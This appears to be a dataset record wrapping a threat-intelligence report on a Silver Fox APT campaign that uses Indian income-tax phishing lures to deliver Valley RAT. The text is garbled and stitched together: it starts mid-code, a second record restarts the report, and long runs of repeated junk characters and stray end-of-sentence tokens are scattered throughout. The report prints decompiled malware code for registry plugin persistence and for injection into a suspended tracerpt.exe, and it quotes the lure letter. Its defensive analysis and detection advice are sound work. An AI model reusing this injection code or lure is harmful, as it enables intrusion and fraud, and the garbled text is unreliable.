L\"Console\\\\0\", &hKey)) \n\n{\n\nRegDeleteValueW(hKey, L\"d33f351a4aeea5e608853d1a56661059\");\n\nRegSetValueExW(hKey, L\"d33f351a4aeea5e608853d1a56661059\", 0, REG_BINARY, (const BYTE *)dst, cbData);\n\n}\n\nRegCloseKey(hKey);\n\noperator delete[](dst);\n\n}\n\nArgList_1 = ArgLista;\n\nv8 = _beginthreadex(0, 0, sub_4052C0, ArgLista, 0, 0);\n\ngoto LABEL_21;\n\ntype = 3;\n\nbData = 0;\n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\\\\0\", 0, KEY_READ, &phkResult))\n\nRegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, 0, &cbData);\n\nif ( cbData > 0xA44 )\n\ndst_1 = (char *)operator new[](cbData);\n\nmemset(dst_1, 0, cbData);\n\nif (!RegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, (LPBYTE)dst_1, &cbData))\n\n{\n\nqmemcpy(&dst_, dst_1, 0xA44u);\n\nlpAddress = VirtualAlloc(0, Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\nmemcpy_0(lpAddress, dst_1 + 2628, Size);\n\n}\n\nhKey_1 = hKey;\n\n}\n\nRegCloseKey(phkResult);\n\nArgList_1 = ArgLista;<｜end▁of▁sentence｜>\n  \n\nValley RAT implements a modular plugin architecture that enables dynamic capability extension through registry- based persistence. The malware stores downloaded plugins in HKCU\\Console\\0\\d33f351a4aeea5e608853d1a56661059 a registry value name consistent with Valley RAT's established fingerprint, following the MD5 hash naming convention observed across multiple Valley RAT campaigns. The plugin manager operates in two modes: it either receives modules from the C2 server, allocates executable memory with PAGE_EXECUTE_READWRITE permissions, and persists the 2628- byte configuration plus payload code to the registry as REG_BINARY data, or it retrieves previously stored plugins from the registry, validates them against a hardcoded signature, and spawns execution threads.  \n\nEach plugin includes a magic byte guard (0xC9) to prevent double- execution. This architecture allows Silver Fox operators to deploy specialized capabilities such as advanced keylogging, credential harvesting, or lateral movement modules on- demand to compromised systems, with automatic persistence across reboots through registry storage.  \n\nGetSystemDirectoryA(Buffer, @xFFu); \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\SysWOW64\\\\tracerpt.exe\"); \n\nif ( GetFileAttributesA(Buffer) == -1 ) \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\System32\\\\tracerpt.exe\"); \n\nresult = CreateProcessA(Buffer, 0, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &StartupInfo, lpProcessInformation); \n\nif ( result ) \n\nlpBaseAddress = VirtualAllocEx( \n\nlpProcessInformation->hProcess, 0, \n\ndwSize, \n\nMEM_COMMIT | MEM_RESERVE, \n\nPAGE_EXECUTE_READWRITE); \n\nif ( lpBaseAddress \n\n&& WriteProcessMemory(lpProcessInformation->hProcess, lpBaseAddress, lpBuffer, dwSize, 0) \n\n&& (hThread = lpProcessInformation->hThread, Context.ContextFlags = 65543, GetThreadContext(hThread, &Context)) \n\n&& (hThread_1 = lpProcessInformation->hThread, \n\nContext.Eip = (DWORD)lpBaseAddress, \n\nSetThreadContext(hThread_1, &Context)) ) \n\n{ \n\nResumeThread(lpProcessInformation->hThread); \n\nreturn 1;<｜end▁of▁sentence｜>\n\n<center>Tracerpt Injection </center>  \n\nAfter downloading plugins from the C2 server, Valley RAT injects them into tracerpt.exe, a legitimate signed Microsoft utility, using the same process following. The malware creates the process in a suspended state, injects the plugin code into its memory, and redirects execution to the malicious payload. Before injection, it patches the plugin with the same 4768- byte configuration containing C2 addresses and feature flags analyzed earlier.  \n\n## Pivoting  \n\nLet's start with the C2 embedded within the decoy document \"ggwk[.]cc\".\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n  \n\nThe C2 has 2 different titles over time, all of them in- line with the Income- tax- themed phishing lure, both from the same ASN. However, there's a common denominator - the favicon.  \n\n<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nWe found 10+ domains that share the same favicon. If we look at the http response titles, we can see that all the titles are Income-tax-themed. The results can be validated against VT to discover additional samples from this campaign. Refer to the IOCs section below.  \n\n<｜end▁of▁sentence｜>\n  \n\n## Diamond Model  \n\n## ADVERSARY \n\nThreat Actor: Silver Fox APT \n\nAttribution Confidence: High \n\nRationale: \n\nRaze of income-tax-themed lures previously observed in Silver Fox operations \n\nNGSI = signed binary DLL hijacking = Donut schedule chain consistent with Chinese APT toolchain \n\nMotivations: Espionage / long-term access \n\nSophistication: High (anti-analysis, in-memory execution, living-off-the-land abuse) \n\n## VICTIM \n\n### Target Profile \n\nIndian enterprises and users \n\nFrance, tax, and business-relevant personas \n\n### Exposures \n\nUser-level compromise escalating to persistent RAT control \n\nLong dwell time risk due to stealthy registry persistence \n\n### Operational Risk \n\nSilent surveillance \n\nCredential theft \n\nSelective deployment of high-risk modules only when needed \n\n## Silver Fox APT - IncomeTax Campaign \n\n### CAPABILITY \n\n### Initial Access \n\nPhishing with government-themed PDF lure \n\n### Execution & Loader Chain \n\nNESS installer \n\nSigned binary DLL hijacking \n\nProcess hooking into explorer.exe \n\nDonut-generated in-memory loader \n\n### Stage 4: Valley RAT Core \n\nTwo-stage configuration system (embedded + registry override) \n\n22-parameter operational config \n\nMulti-tier CI loop with protocol switching \n\n### Post-Compromise Capabilities \n\nKeylogging (M) \n\nInteractive shell (sh) \n\nFile download / upload (df) \n\nFull backdoor mode (xd) \n\n### Modular Expansion \n\nPlugin delivery via CI \n\nIn-memory execution + registry persistence \n\nPlugin integrity checks and execution guards \n\n## INFRASTRUCTURE \n\nInitial Redirect / Decoy Hosting \n\ngop@.ix \n\nIP: 45.207.231.94 \n\nCommand & Control \n\nN: [yuxuanow].top \n\nIP: 103.20.199.2147 \n\nPlotted Infrastructure (Shared Favorites / Patrolled Domains) \n\nlald.club = 45.207.231.107 \n\ngov=work, gov=a.fh, gov=a.club, gov=c.club, gov.club, gov=b.club = 160.124.3.103 \n\nxqghw.com = 8.217.9.165 \n\ndngtaki.cn = 47.239.225.43 \n\nhiko.cn, kiyoi.club, hhmm.wark = 43.100.22.158 \n\nsec2020gb.cn, 2025wmm.cn = 43.100.123.207 \n\nhiko.wark = 43.100.63.145 \n\n### ASN reuse over time: AS112839, AS149801 \n\n### Design Characteristics \n\nThree-tier failover with retry thresholds (200 failures) \n\nMixed protocol support (HTTPs) + two TCPs \n\nRegistry-driven dynamic CI updates \n\nResilience Features<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\n## Impact  \n\nHigh risk of long- term undetected compromise: Registry- resident plugins and delayed beaconing allow the RAT to survive reboots while remaining low- noise. Dynamic threat evolution post- infection: Attackers can upgrade capabilities (keylogging, credential theft, lateral movement) without taking initial access again or malware redeployment. Infrastructure- based blocking is brittle: Tiered C2 failover and protocol switching reduce the effectiveness of static IP/domain blocking. Reduced visibility for incident response: In- memory execution combined with registry- based persistence complicates timeline reconstruction and malware eradication. Elevated data security risk: On- demand module delivery enables targeted credential harvesting and surveillance tailored to victim role and value.  \n\n## Recommendations  \n\nMonitor registry abuse as a persistence layer: Alert on executable REG_BINARY blobs and anomalous values under non- standard paths such as HKCU\\Console\\*, especially those written by user processes. Detect multi- tier C2 logic, not just domains: Build detections for retry- heavy outbound connections, protocol switching (HTTP \\(\\leftrightarrow\\) raw TCP), delayed first beacon, and repeated failures followed by fallback behavior. Instrument memory- permission anomalies: Alert on processes allocating PAGE_EXECUTE_READWRITE memory followed by thread creation, particularly inside explorer.exe. Hunt for signed binary + local DLL load patterns: Correlate execution of signed binaries from temp directories with unsigned DLL loads and immediate child thread creation. Treat RAT feature enablement as an alerting signal: Monitor sudden activation of keylogging APIs, interactive shell behavior, or file transfer operations within long- running, previously quiet processes.  \n\n## Appendix  \n\n## IOCs  \n\n<table><tr><td>Indicator Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Sha256 Hash</td><td>77ea62ff74a66f61a511eb6b6edac20be9822fa9cc1e7354a8cd6379c7b9d2d2</td><td>Stage 1</td></tr><tr><td>Sha256 Hash</td><td>fa388a6cdd28ad5dd83acd674483828251f21cbefaa801e839ba39af24a6ac19</td><td>Stage 2</td></tr><tr><td>Sha256 Hash</td><td>f74017b406e993bea5212615febe23198b09ecd73ab79411a9f6571ba1f94cfa</td><td>Stage 3</td></tr><tr><td>Sha256 Hash</td><td>068e49e734c2c7be4fb3f01a40bb8beb2d5f4677872fabbed7741245a7ea97c</td><td>Stage 4</td></tr><tr><td>Domain</td><td>ggwk[.]cc</td><td>Embedded<br>Domain Within<br>Decoy Attachment</td></tr></table>\n\n<--- Page Split --->\n\n\n<table><tr><td>Indicator<br>Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Domain</td><td>b[.]yuxuanow[.]top</td><td>Shellcode C2</td></tr><tr><td>IP</td><td>45.207.231[.]94</td><td>Resolution from<br>ggwk[.]cc</td></tr><tr><td>IP</td><td>103.20.195[.]147</td><td>Resolution from<br>b[.]yuxuanow[.]top</td></tr></table>", "format_code": "lpAddress=VirtualAlloc(0,Size,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);memcpy_0(lpAddress,dst_1+2628,Size);", "hash": "hash"}
{"file_name": "fed9c11a-b86a-49a9-a9e2-24332f01a81c.md", "title": "Silver Fox Targeting India Using Tax Themed Phishing Lures", "malicious_code": "result = CreateProcessA(Buffer, 0, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &StartupInfo, lpProcessInformation);", "describe": "cloudsek.com/blog/silver- fox- targeting- india- using- tax- themed- phishing- lures  \n\nPrajwal Awasthi  \n\nTable of Content  \n\nSubscribe to CloudSEK Resources  \n\nGet the latest industry news, threats and resources.  \n\n## Executive Summary  \n\nCloudSEK's TRIAD discovered a campaign by Silver Fox APT targeting India with Income tax themed phishing lures. The lure is visually identical to the ones discovered by other vendors, however, this campaign has not been attributed to a specific threat actor before this report. Attribution accuracy is critical to threat intelligence; it enables defenders to predict adversary behavior and deploy targeted countermeasures. Misattribution from trusted sources propagates through threat feeds and detection systems, causing organizations to focus on the wrong threat while the actual adversary operates undetected. Attributing this campaign to SideWinder APT (India- aligned) contradicts basic victimology and creates systemic confusion. Using our report aims to highlight the sophisticated kill chain by the Chinese APT group, and explains the rationale behind CloudSEK's attribution.  \n\n## Kill Chain  \n\n<｜end▁of▁sentence｜>\n  \n\n## Initial Access Vector  \n\nTOPSOE INDIA PRIVATE LIMITED \n\n \n\nस्वरोचन ने अधिकार - Allgate/1/6/6/6/6/6/6/6/6/6/6/1/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/\n  \n\nMalicious email  \n\nWe found an interesting email uploaded from India with just an attachment called \"TOPsoE India Private Limited\". The pdf looked like an official Income Tax Department document. Upon clicking on the pdf, \"ggwk[.]cc\" opens up on the browser and a zip file called \"tax affairs.exe\" is downloaded.\n\n<--- Page Split --->\n\nNo. TAX/PEN/2025-142 \n\nभारत सरकार / Government of India\nवित्त मंत्रालय / Ministry of Finance\nआयकर विभाग / Income Tax Department\nप्रवर्तन प्रभाग / Enforcement Division \n\nAayakar Bhavan,\nNew Delhi - 110001 \n\nOFFICE MEMORANDUM \n\nSub: कर अनुपालन की कमी और दंड सूचना / Tax Compliance Deficiency and Penalty Notice \n\n1. आपकी कमनी की कर निरीक्षण के दौरान आयकर अधिनियम, 1961 की धारा 271(1)(c) के तहत कर संबंधी अनियमिताएं पाई गई हैं। The tax inspection of your company has revealed irregularities under Section 271(1)(c) of the Income Tax Act, 1961. \n\n2. इस सूचना की प्राप्ति के 72 घंटे (3 दिन) के भीतर निम्नलिखित दस्तावेज आयकर विभाग को प्रस्तुत करना अनिवार्य है। It is mandatory to submit the following documents to the Income Tax Department within 72 hours (3 days) of receipt of this notice. \n\nआवश्यक दस्तावेज सूची / Required Documents List\nनीचे दिए गए लिंक से दस्तावेज डाउनलोड करें / Download documents from the link below \n\nदस्तावेज डाउनलोड करें / Download Documents \n\n3. निर्धारित समयावधि में दस्तावेज प्रस्तुत न करने पर आयकर अधिनियम की धारा 276C के तहत कानूनी कार्रवाई की जाएगी। Legal action will be taken under Section 276C of the Income Tax Act if documents are not submitted within the stipulated time. \n\n(राज कुमार शर्मा) \n\nRaj Kumar Sharma \n\nसहायक आयकर आयुक्त \n\nAssistant Commissioner of Income Tax \n\nTechnical Analysis \n\nStage - 1: Tax Affairs.zip \n\nPE32 \n\nOperation system: Windows(2000)[1386, 32-bit, GUI] \n\nLinker: Microsoft Linker(10.00.40219) \n\nCompiler: Microsoft Visual C/C++(16.00.40219)[C] \n\nLanguage: C \n\nTool: Visual Studio(2010) \n\n(Heur) Packer: Compressed or packed data[Strange overlay] \n\nInstaller: Nullsoft Scriptable Install System(2.46.5-ANSI) \n\nOverlay: Binary[Offset=0x00034c00,Size=0x002a2e40] \n\nUnknown: Unknown \n\nDetect It Easy \n\nUsing static analysis we see that the given PE file is a 32 bit GUI binary. More importantly, the file is identified as a Nullsoft Scriptable Install system (NSIS) installer. NSIS installers embed their installation script, compressed payloads etc inside the binary itself and we can move ahead to analyse it as an installer driven staging payload.\n\n<--- Page Split --->\nGetTempPathA(0x10000u, PathName); \n\nif ( sub_4032CB() || (GetWindowsDirectoryA(PathName, 0xFFBu), lstrcatA(PathName, \"\\Temp\"), sub_4032CB()) \n\nDeleteFileA(FileName); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = (const char *)sub_403030(Buffer); \n\nif (!Error_writing_temporary_file._Make_sure_your_temp_folder_is_val ) \n\nif (!dword_433C24 ) \n\n{ \n\nABEL_34: \n\nuExitCode = -1; \n\nuExitCode = sub_4052E6(); \n\ngoto LABEL_35; \n\n} \n\nfor ( i = (CHAR *)sub_40567B(&sz, 0); i >= &sz && sub_4032FF(i, \"_=\", 4); --i ) \n\n; \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = \"Error launching installer\"; \n\nif ( i >= &sz ) \n\n{ \n\n* i = 0; \n\nlpString2_3 = i + 4; \n\nif ( !sub_405EFC(lpString2_3) ) \n\ngoto LABEL_35; \n\nlstrcpyAn_wrp(&lpString1_, lpString2_3); \n\nlstrcpyAn_wrp(Directory, lpString2_3); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = 0; \n\ngoto LABEL_34; \n\n} \n\nlstrcatA(PathName, \"\\nsu.tmp\"); \n\nif ( lstrcmpiA(PathName, ::lpString2) ) \n\n{ \n\nCreateDirectoryA(PathName, 0); \n\nSetCurrentDirectoryA(PathName); \n\nif ( !lpString1_ ) \n\nlstrcpyAn_wrp(&lpString1_, ::lpString2); \n\nlstrcpyAn_wrp(lpString1_, lpString2); \n\nlstrcpyAn_wrp(&lpString1_0, \"A\"); \n\nn26 = 26;<｜end▁of▁sentence｜>\n\n<center>NSIS Installer </center>  \n\nThe NSIS installer begins by resolving a writable temporary directory using GetTempPathA. If the operation fails, it falls back to C:\\Windows\\Temp, ensuring execution reliability. Once a valid location is identified, the installer creates an NSIS specific working directory (\\~nsu.tmp) and switches the directory to it.  \n\nDropped Files   \n\n<table><tr><td>ndoe &amp;gt; AppData &amp;gt; Local &amp;gt; Temp</td><td></td><td></td><td></td></tr><tr><td>Name</td><td>Date modified</td><td>Type</td><td>Size</td></tr><tr><td>Thunder.exe</td><td>7/24/2024 10:42 PM</td><td>Application</td><td>635 KB</td></tr><tr><td>FastAnimation.dll</td><td>5/27/2025 4:38 